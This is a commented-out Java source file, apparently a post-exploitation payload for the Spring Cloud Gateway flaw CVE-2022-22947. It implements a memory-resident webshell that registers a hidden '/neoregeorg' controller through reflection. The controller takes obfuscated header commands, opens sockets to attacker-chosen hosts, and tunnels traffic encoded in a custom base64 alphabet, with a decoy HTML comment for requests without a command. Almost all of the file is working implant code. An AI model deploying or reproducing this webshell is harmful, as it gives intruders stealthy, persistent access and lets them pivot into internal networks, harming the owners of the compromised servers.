//package com.example.cve_2022_22947;
//
//import org.springframework.web.context.WebApplicationContext;
//import org.springframework.web.context.request.RequestContextHolder;
//import org.springframework.web.context.request.ServletRequestAttributes;
//import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
//import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
//import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
//import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
//
//import javax.servlet.ServletOutputStream;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import javax.servlet.http.HttpSession;
//import java.io.ByteArrayOutputStream;
//import java.lang.reflect.Method;
//import java.net.InetSocketAddress;
//import java.nio.ByteBuffer;
//import java.nio.channels.SocketChannel;
//
//public class MemNeoregeorg {
//    private static byte[] de = new byte[] {-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,30,-1,-1,-1,31,24,40,13,25,52,60,46,4,10,20,-1,-1,-1,-1,-1,-1,-1,19,43,37,0,54,15,42,16,56,3,44,34,50,53,14,33,62,21,12,17,27,63,41,49,2,48,-1,-1,-1,-1,-1,-1,39,36,6,18,22,58,11,32,57,9,7,61,51,28,55,23,1,59,35,29,38,8,45,26,47,5,-1,-1,-1,-1,-1};
//    private static char[] en = "DqYJ7zckvj8gS2OFHTdA9Rep03xUnt+/hPLsbCua1WGBKw6yZXMm4NEoIifr5lQV".toCharArray();
//
//
//    public MemNeoregeorg() throws Exception{
//        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
//                currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
//        // 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
//        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
//        // 通过反射获得自定义 controller 中唯一的 Method 对象
//        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
//        // 属性被 private 修饰，所以 setAccessible true
//        method.setAccessible(true);
//        // 通过反射获得该类的test方法
//        Method method2 = MemNeoregeorg.class.getMethod("test");
//        // 定义该controller的path
//        PatternsRequestCondition url = new PatternsRequestCondition("/neoregeorg");
//        // 定义允许访问的HTTP方法
//        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
//        // 在内存中动态注册 controller
//        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
//        // 创建用于处理请求的对象，避免无限循环使用另一个构造方法
//        MemNeoregeorg injectToController = new MemNeoregeorg("aaa");
//        // 将该controller注册到Spring容器
//        mappingHandlerMapping.registerMapping(info, injectToController, method2);
//    }
//
//    private MemNeoregeorg(String aaa) {
//    }
//
//    void puts(HttpServletResponse r, String str) throws Exception {
//        byte[] bs = str.getBytes();
//        ServletOutputStream so = r.getOutputStream();
//        so.write(bs, 0, bs.length);
//        so.close();
//    }
//
//    public static String b64en(byte[] data) {
//        StringBuffer sb = new StringBuffer();
//        int len = data.length;
//        int i = 0;
//        int b1, b2, b3;
//        while (i < len) {
//            b1 = data[i++] & 0xff;
//            if (i == len) {
//                sb.append(en[b1 >>> 2]);
//                sb.append(en[(b1 & 0x3) << 4]);
//                sb.append("==");
//                break;
//            }
//            b2 = data[i++] & 0xff;
//            if (i == len) {
//                sb.append(en[b1 >>> 2]);
//                sb.append(en[((b1 & 0x03) << 4)
//                        | ((b2 & 0xf0) >>> 4)]);
//                sb.append(en[(b2 & 0x0f) << 2]);
//                sb.append("=");
//                break;
//            }
//            b3 = data[i++] & 0xff;
//            sb.append(en[b1 >>> 2]);
//            sb.append(en[((b1 & 0x03) << 4)
//                    | ((b2 & 0xf0) >>> 4)]);
//            sb.append(en[((b2 & 0x0f) << 2)
//                    | ((b3 & 0xc0) >>> 6)]);
//            sb.append(en[b3 & 0x3f]);
//        }
//        return sb.toString();
//    }
//
//    public static byte[] b64de(String str) {
//        byte[] data = str.getBytes();
//        int len = data.length;
//        ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
//        int i = 0;
//        int b1, b2, b3, b4;
//        while (i < len) {
//            do {
//                b1 = de[data[i++]];
//            } while (i < len && b1 == -1);
//            if (b1 == -1) {
//                break;
//            }
//            do {
//                b2 = de[data[i++]];
//            } while (i < len && b2 == -1);
//            if (b2 == -1) {
//                break;
//            }
//            buf.write((int) ((b1 << 2) | ((b2 & 0x30) >>> 4)));
//            do {
//                b3 = data[i++];
//                if (b3 == 61) {
//                    return buf.toByteArray();
//                }
//                b3 = de[b3];
//            } while (i < len && b3 == -1);
//            if (b3 == -1) {
//                break;
//            }
//            buf.write((int) (((b2 & 0x0f) << 4) | ((b3 & 0x3c) >>> 2)));
//            do {
//                b4 = data[i++];
//                if (b4 == 61) {
//                    return buf.toByteArray();
//                }
//                b4 = de[b4];
//            } while (i < len && b4 == -1);
//            if (b4 == -1) {
//                break;
//            }
//            buf.write((int) (((b3 & 0x03) << 6) | b4));
//        }
//        return buf.toByteArray();
//    }
//
//    public void test() throws Exception {
//        // 获取request和response对象
//        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
//        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
//        HttpSession session=request.getSession();
//
//        response.setStatus(200);
//        String cmd = request.getHeader("Cz");
//        if (cmd != null) {
//            String mark = cmd.substring(0,22);
//            cmd = cmd.substring(22);
//            response.setHeader("Gs", "zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe");
//            if (cmd.compareTo("GVwydX22KEDdLXVNICQlK7VigwqOr1") == 0) {
//                try {
//                    String[] target_ary = new String(b64de(request.getHeader("Ahjncviespbziuar"))).split("\\|");
//                    String target = target_ary[0];
//                    int port = Integer.parseInt(target_ary[1]);
//                    SocketChannel socketChannel = SocketChannel.open();
//                    socketChannel.connect(new InetSocketAddress(target, port));
//                    socketChannel.configureBlocking(false);
//                    session.setAttribute(mark, socketChannel);
//                    response.setHeader("Gs", "zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe");
//                } catch (Exception e) {
//                    response.setHeader("Rhikuunn", "2dzkzCC6JbZpMe30VuvalwvNc702mw1QqbKbekOHbKCZmb3gM0JMD3l2");
//                    response.setHeader("Gs", "pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW");
//                }
//                puts(response, "");
//            } else if (cmd.compareTo("E4oGJ6dPZO9wSJpJ4kY8AwXJ0UTXs072uvB") == 0) {
//                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
//                try{
//                    socketChannel.socket().close();
//                } catch (Exception e) {
//                }
//                session.removeAttribute(mark);
//                puts(response, "");
//            } else if (cmd.compareTo("wqxFnQchjYWANIpP_2O5") == 0){
//                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
//                try{
//                    ByteBuffer buf = ByteBuffer.allocate(513);
//                    int bytesRead = socketChannel.read(buf);
//                    ServletOutputStream so = response.getOutputStream();
//                    while (bytesRead > 0){
//                        byte[] data = new byte[bytesRead];
//                        System.arraycopy(buf.array(), 0, data, 0, bytesRead);
//                        byte[] base64 = b64en(data).getBytes();
//                        so.write(base64, 0, base64.length);
//                        buf.clear();
//                        bytesRead = socketChannel.read(buf);
//                    }
//                    so.close();
//                    response.setHeader("Gs", "zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe");
//
//                } catch (Exception e) {
//                    response.setHeader("Gs", "pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW");
//                }
//
//            } else if (cmd.compareTo("fDVO47AZO6TXX5WT9oQJHTUFgtNTLslwRV6") == 0){
//                SocketChannel socketChannel = (SocketChannel)session.getAttribute(mark);
//                try {
//
//                    int readlen = request.getContentLength();
//                    byte[] buff = new byte[readlen];
//
//                    request.getInputStream().read(buff, 0, readlen);
//                    byte[] base64 = b64de(new String(buff));
//                    ByteBuffer buf = ByteBuffer.allocate(base64.length);
//                    buf.clear();
//                    buf.put(base64);
//                    buf.flip();
//
//                    while(buf.hasRemaining())
//                        socketChannel.write(buf);
//
//                    response.setHeader("Gs", "zWQerW2uiqArhyKyQJSKFkEYBoh546MmAGmqNe");
//
//                } catch (Exception e) {
//                    response.setHeader("Rhikuunn", "BUpCTMWYPB0W0z1xw7MBOK26I");
//                    response.setHeader("Gs", "pmRO3UjyF3OtcU5Z0Ty0epe9VKmObv0nF6fjW");
//                    socketChannel.socket().close();
//                }
//                puts(response, "");
//            }
//        } else {
//            puts(response, "<!-- OnPi3V9A0mDFCR2mjWB6R132S3A1SswOD3XTr6cqcHHSqjksLziNsPtSi5 -->");
//        }
//    }
//}